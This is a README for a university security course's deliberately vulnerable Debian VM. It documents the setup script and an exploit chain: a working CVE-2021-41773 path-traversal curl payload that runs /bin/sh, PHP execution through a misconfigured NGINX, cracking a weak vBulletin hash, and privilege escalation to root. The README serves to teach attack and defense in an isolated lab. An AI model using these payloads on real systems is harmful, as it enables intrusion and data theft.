# Files in this repo

## setup.sh

This file is intended to be executed as root on the guest VM. Do not run it on your host OS; it will do bad things. You can (and perhaps should) run this file line by line since it does no error checking.

This script will:
* Install sudo, build-essential, and the build dependencies for apache2
* Install NGINX, MariaDB, and php-fpm
* Add a default 404 page, abronsius.cpsc4270.local, and alfred.cpsc4270.local to NGINX
* Create the user `abronsius` (if not existing) and add it to the sudoers list
* Download, build, and install apache2 2.4.49 at `/home/abronsius/apache2`
* Configure apache2 to serve files and enable cgi-bin
* Download, configure, and install XenForo at alfred.cpsc4270.local
* Create a XenForo user named "Abronsius" with a vBulletin-imported password
* ... more coming later

TODO:
* Download, install, configure phpMyAdmin (or other software) for SQL injection
  * Find a way to tie-in SQL injection to springboard another attack
* Crete an actual page for abronsius.cpsc4270.local.
  * Currently cgi-bin hosts a cal.sh script

CONSIDER:
* Implement https://github.com/Balasys/dheater for DoS

# VM OS

The OS is Debian 11.1 Bullseye but any Debian-based OS should also work. I don't recommend deviating from this choice in case there are compatibility issues, and any non-Debian OS will require installing and configuring everything manually. Download via [Torrent](https://cdimage.debian.org/debian-cd/current/amd64/bt-cd/debian-11.1.0-amd64-netinst.iso.torrent) or directly via [ISO](https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/debian-11.1.0-amd64-netinst.iso). The sha256sum of the ISO is `8488abc1361590ee7a3c9b00ec059b29dfb1da40f8ba4adf293c7a30fa943eb2` to double check that you've obtained the correct file.

I do not recommend installing any desktop environment (GUI) because it is not necessary and will waste resources. You must install SSH server and connect to the VM with an SSH client. Linux and OSX come standard with an SSH client. Windows might have its own native client, but [PuTTY](https://the.earth.li/~sgtatham/putty/latest/w64/putty-64bit-0.76-installer.msi) should work if not.


# VM Configuration

The VM can be installed using any software (qemu/kvm, VirtualBox, VMWare, etc.)
The only requirement is network access with its own IP address. This can (and should) be a totally local network. The VM will contain several serious security flaws and therefore should not be available over the Internet.

# Exploits

## Exploit Target 1: Apache

### Exploit 1: CVE-2021-41773

This vulnerability is trivial to exploit and results in directory traversal, local file inclusion, and remote code execution. This exploit takes advantage of a new form of URL normalisation added in this version of apache2 which did not appropriately check against URL-encoded paths, which in this instance allows moving up from the cgi-bin directory and executing arbitrary code on the remote server. This line brings the directory up to `/` and then executes `/bin/sh` and passes `echo;ls -alh /etc/passwd;whoami;uname -a` to the opened shell.

Remote code execution:
```sh
curl --path-as-is "http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh" -d "echo;ls -alh /etc/passwd;whoami;uname -a"
```

Example output:
```
-rw-r--r-- 1 root root 1.6K Oct 23 23:38 /etc/passwd
abronsius
Linux dbsec-vm-main 5.10.0-9-amd64 #1 SMP Debian 5.10.70-1 (2021-09-30) x86_64 GNU/Linux
```
## Exploit Target 2: NGINX+php-fpm+UGC

### Exploit 2: Misconfigured NGINX fastcgi_pass for PHP

This exploit results in RCE on the php-fpm process (running as www-data as currently configured) which can then be leveraged to connect directly to the locally running apache server running as the abronsius user and execute another RCE to obtain access to that user's files.

The exploit allows executing arbitrary files as PHP because NGINX has been poorly configured to pass any URL ending in .php to php-fpm, and php-fpm has been configured to allow the execution of files not ending in .php via `security.limit_extensions`. This exploit would also work on earlier versions of PHP before this option was added.

If a user uploads a file which gets saved at a publicly accessible location, it could be executed by browsing to a URL such as `http://alfred.cpsc4270.local/internal_data/attachments/0/2-2dab5576695298f017741b114f67c3f1.data/oops.php`. This works because NGINX was not configured to verify that such a file exists, and PHP will happily read from left to right until it finds a file that exists and execute it, so the trailing /oops.php isn't considered for this purpose.

## Exploit Target 3: vBulletin imported users

### Exploit 3: Cracking a weak password with a weak password hash

This exploit takes advantage of the fact that a user account which has not been logged into since being imported from vBulletin to XenForo will still have a vBulletin hash of md5(md5(password).salt) which is considerably weak. Further assisting the attack, the password is weak as it is all lowercase and a single word.


## Intermediary Exploits

### Exploits 4, 5: Horizontal and Vertical Privilege Escalation

Performing RCE against php-fpm allows obtaining access to everything that process has access to, namely anything the www-data user has access to. From here, it can be discovered that an Apache server is running on 127.0.0.1:8080 and can be exploited via CVE-2021-41773 for RCE. This results in horizontal privilege escalation to the abronsius user. Combined with the password which was cracked, and the fact that abronsius was given sudo access, this allows obtaining access to the root user.

### Exploit 6: Unencrypted Sensitive Data At Rest

The file located at `src/config.php` within XenForo contains the database access information, including the password in plaintext. If this file can ever be read by an attacker, they can obtain everything they would need to access the database. Preventing database access, however, is the fact that the database software is only configured to listen on localhost, and additionally that all of the configured users are only allowed to authenticate at localhost as well. Therefore, an attacker would have to obtain RCE of some sort in order to access the database, or make use of a publicly accessible phpMyAdmin installation.
